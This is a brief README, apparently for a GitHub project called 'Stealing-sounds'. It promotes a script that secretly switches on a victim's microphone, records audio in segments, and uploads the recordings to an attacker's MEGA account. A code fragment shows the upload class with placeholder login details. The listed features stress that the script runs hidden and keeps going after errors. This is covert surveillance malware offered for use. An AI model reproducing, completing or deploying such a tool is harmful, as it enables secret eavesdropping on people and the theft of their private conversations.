# Stealing-sounds

The script turns on the microphone to record audio from the victim's device and sends it to the MEGA website in an audio document format

```python
class Upload(object):
    def __init__(self):
        self.up         = Mega()
        self.user       = 'Your Email Address' # Your Email in Mega.nz
        self.password   = 'Your Password' # Your Password in Mega.nz
 ```
 -----
 
 * Works only when online
 * Divides audio segments into semi - finished and transmitted segments to facilitate transmission
 * Works behind the scenes
 * Does not stop if any unexpected error occurs


